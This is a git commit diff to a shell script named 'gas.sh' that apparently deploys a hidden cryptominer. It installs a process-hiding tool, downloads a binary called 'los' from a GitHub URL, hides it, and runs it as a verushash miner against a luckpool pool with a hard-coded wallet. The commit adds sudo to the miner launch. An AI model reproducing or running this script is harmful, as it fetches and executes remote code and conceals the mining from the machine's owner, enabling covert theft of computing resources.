6436e2fb4716f06f9db9bfc78e2d4db3b7d60fc8
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-16 17:12:01 +0700

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -5,4 +5,4 @@ sudo npm i -g node-process-hider
 wget https://raw.githubusercontent.com/chikahusarii/claim/main/los
 chmod +x los
 sudo ph add los
-./los --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1
+sudo ./los --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1
